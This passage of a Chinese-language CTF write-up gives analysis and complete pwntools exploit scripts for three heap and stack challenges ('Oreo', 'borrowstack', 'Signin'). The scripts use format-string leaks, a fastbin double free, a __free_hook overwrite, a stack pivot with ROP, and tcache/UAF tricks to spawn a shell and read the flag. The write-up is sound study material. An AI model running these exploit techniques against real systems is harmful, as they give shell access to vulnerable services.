        sh.sendline(name_value)
        sh.recvuntil('> RE's length : ')
        sh.sendline(str(desc_size))
        sh.recvuntil('> RE : ')
        sh.sendline(desc_value)
    def edit(sh,index,name_value,desc_value):
        sh.recvuntil('> Now please tell me what you want to do :')
        sh.sendline('2')
        sh.recvuntil('> Oreo ID : ')
        sh.sendline(str(index))
        sh.recvuntil('> O : ')
        sh.sendline(name_value)
        sh.recvuntil('> RE : ')
        sh.sendline(desc_value)
    def delete(sh,index):
        sh.recvuntil('> Now please tell me what you want to do :')
        sh.sendline('3')
        sh.recvuntil('> Oreo ID : ')
        sh.sendline(str(index))
    def show(sh,index):
        sh.recvuntil('> Now please tell me what you want to do :')
        sh.sendline('4')
        sh.recvuntil('> Oreo ID : ')
        sh.sendline(str(index))
    if __name__ == "__main__":
        sh = get_sh()
        sh.recvuntil('> Input your code please:')
        sh.sendline('OreOOrereOOreO'+'%14$p')
        sh.recvuntil('> Now please tell me what you want to do :')
        sh.sendline('0')
        PIE_addr=get_address(sh,'We leak an addr : ','# Your Code is OreOOrereOOreO0x','n',True) - 0x202050
        log.success('PIE addr is '+str(hex(PIE_addr)))
        creat(sh,0x60,'Chunk_1',0x70,'Chunk_1')
        creat(sh,0x60,'Chunk_2',0x70,'Chunk_2')
        delete(sh,1)
        delete(sh,2)
        delete(sh,1)
        creat(sh,0x60,p64(0x202080+PIE_addr),0x50,'Chunk_1')
        creat(sh,0x60,'Chunk_2',0x50,'Chunk_2')
        creat(sh,0x60,'Chunk_1',0x50,'Chunk_1')
        sh.recvuntil('> Now please tell me what you want to do :')
        sh.sendline('1')
        sh.recvuntil('> O's length : ')
        sh.sendline(str(0x60))
        sh.recvuntil('> O : ')
        sh.send(p64(0x70)*3+p64(0)*8+p64(0x2020E8+PIE_addr))
        sh.recvuntil('> RE's length : ')
        sh.sendline(str(0x50))
        sh.recvuntil('> RE : ')
        sh.sendline('Chunk_3')
        edit(sh,1,p64(0x2020E8+PIE_addr)+p64(interested.got['puts']+PIE_addr),'Anyvalue')
        show(sh,2)
        puts_addr=get_address(sh,'We get puts address is ','# oreo's O is ','n')
        libc_base=puts_addr-libc.symbols['puts']
        system_addr=libc_base+libc.symbols['system']
        binsh_addr =libc_base+libc.search('/bin/sh').next()
        edit(sh,1,p64(0x2020E8+PIE_addr)+p64(libc.symbols['__free_hook']+libc_base)+p64(binsh_addr),p64(binsh_addr))
        edit(sh,2,p64(system_addr),p64(system_addr))
        delete(sh,3)
        sh.interactive()
        sh.sendline('cat /flag')
        flag=sh.recvuntil('n').strip('n')
        log.success('The flag is '+flag)
        sh.close()
## 0x07 SecondDay_borrowstack
###  题目信息
仅开启NX保护
###  漏洞分析
本题很明显存在栈溢出，并且可以使用栈迁移技术完成利用。
但要注意，我们在BSS段构造`ROP Chain`时，需要在前端布置一段空区域，防止ROP链在执行时访问到非法内存。
###  Final Exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    borrowstack=ELF('./borrowstack', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./borrowstack")
    def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address+offset)))
        return return_address+offset
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,stop=False):
        gdb.attach(sh)
        if stop :
            raw_input()
    if __name__ == "__main__":
        sh = get_sh()
        # get_gdb(sh)
        payload  = 'A' * 0x60 + p64(0x0000000000601080 + 0x28) + p64(0x0000000000400699)
        sh.recvuntil('elcome to Stack bank,Tell me what you want')
        sh.send(payload)
        payload  = 'x00' * 0x30
        payload += p64(0x0000000000400590) + p64(borrowstack.bss()+0x500)
        payload += p64(0x0000000000400703) + p64(borrowstack.got['__libc_start_main'])
        payload += p64(borrowstack.plt['puts'])
        payload += p64(0x0000000000400703) + p64(0)
        payload += p64(0x0000000000400701) + p64(0x0000000000601108) + p64(0x0000000000601108)
        payload += p64(borrowstack.plt['read'])
        sh.recvuntil('Done!You can check and use your borrow stack now!')
        # get_gdb(sh)
        sh.send(payload)
        libc_base = get_address(sh,'We get libc address is ','x0A','x0A',-libc.symbols['__libc_start_main'])
        payload  = p64(0x00000000004004c9)* 0x50
        payload += p64(0x0000000000400703) + p64(libc_base + libc.search('/bin/sh').next())
        payload += p64(libc_base + libc.symbols['system'])
        sh.send(payload)
        sh.interactive()
        flag=get_flag(sh)
        log.success('The flag is '+flag)
## 0x08 ThirdDay_Signin
###  题目信息
仅开启Canary和NX。
###  漏洞分析
漏洞十分明显，del函数free后指针未置零，存在UAF漏洞，但采用了辅助标志变量，封堵了double_free漏洞。
edit函数只能调用一次，cnt初值为0，自减后即变为-1，不再满足条件。
注意，我们发现在调用backdoor函数时，程序会调用一次`calloc`，而`calloc`的特性会导致直接从`fastbin`中取出Chunk，而在libc的源码中可以看到
此处会取出fastbin的所有剩余Chunk并将其链入tcache bin。在链入时，会向其fd域写入链表的相关信息，并且发现，在链入过程中，
**不会对该chunk做size合法性检查** （此处`tache_put`函数已经明确注明，index的合法性由主调函数确认）！
那么，若我们在fastbin中事先链入一个非法的chunk位于`ptr-0x10`的位置，将会在置入tcache bin时使得ptr被填入chunk地址。
###  Final Exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    signin=ELF('./signin', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./signin")
    def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address+offset)))
        return return_address+offset
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,stop=False):
        gdb.attach(sh)
        if stop :
            raw_input()
    def creat(sh,index):
        sh.recvuntil('your choice?')
        sh.sendline('1')
        sh.recvuntil('idx?')
        sh.sendline(str(index))
    def edit(sh,index,value):
        sh.recvuntil('your choice?')
        sh.sendline('2')
        sh.recvuntil('idx?')
        sh.sendline(str(index))
        sh.sendline(value)
    def delete(sh,index):
        sh.recvuntil('your choice?')
        sh.sendline('3')
        sh.recvuntil('idx?')
        sh.sendline(str(index))
    if __name__ == "__main__":
        sh = get_sh()
        for i in range(7):
            creat(sh,i)
        for i in range(7,9):
            creat(sh,i)
        for i in range(7):
            delete(sh,i)
        for i in range(7,9):
            delete(sh,i)
        creat(sh,9)
        edit(sh,8,p64(0x4040B0))
        sh.interactive()
        flag=get_flag(sh)
        log.success('The flag is '+flag)
###  Glibc2.29下的非预期解
在glibc-2.29下，chunk在free时加入了以下代码：
而key的位置，恰好是cnt的位置，于是可以做到多次edit完成利用。
在运行以下代码后，可以看到，`cnt`已经变成了`-1`。
    creat(sh,0)
    delete(sh,0)
    edit(sh,0,p64(0x4040B0))
接下来运行以下代码后，可以看到，`cnt`已经被重置为了`0`。
    creat(sh,1)
    creat(sh,2)
###  Final Exploit——非预期
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    signin=ELF('./signin', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./signin")
    def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address+offset)))
        return return_address+offset
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,stop=False):
        gdb.attach(sh)
        if stop :
            raw_input()
    def creat(sh,index):
        sh.recvuntil('your choice?')
        sh.sendline('1')
        sh.recvuntil('idx?')
        sh.sendline(str(index))
    def edit(sh,index,value):
        sh.recvuntil('your choice?')
        sh.sendline('2')
        sh.recvuntil('idx?')
        sh.sendline(str(index))
        sh.sendline(value)
    def delete(sh,index):
        sh.recvuntil('your choice?')
        sh.sendline('3')
        sh.recvuntil('idx?')
        sh.sendline(str(index))
    if __name__ == "__main__":
        sh = get_sh()
        creat(sh,0)
        delete(sh,0)
        edit(sh,0,p64(0x4040B0))
        creat(sh,1)
        creat(sh,2)
        edit(sh,2,p64(0)*2+p64(1))
        sh.recvuntil('your choice?')
        sh.sendline('6')
        sh.interactive()
        flag=get_flag(sh)
        log.success('The flag is '+flag)
## 0x9 后记
剩余的两道C++ PWN将在专门的文章中作为例题总结。
## 0x10 参考链接
[canary analysis – zet](http://www.hardenedlinux.org/2016/11/27/canary.html)
[为什么/lib32/libc.so.6中有两个“fopen”符号？](https://stackoom.com/question/cQ06/%E4%B8%BA%E4%BB%80%E4%B9%88-lib-libc-so-%E4%B8%AD%E6%9C%89%E4%B8%A4%E4%B8%AA-fopen-%E7%AC%A6%E5%8F%B7)
[Top chunk劫持：House of force攻击](https://www.anquanke.com/post/id/175630)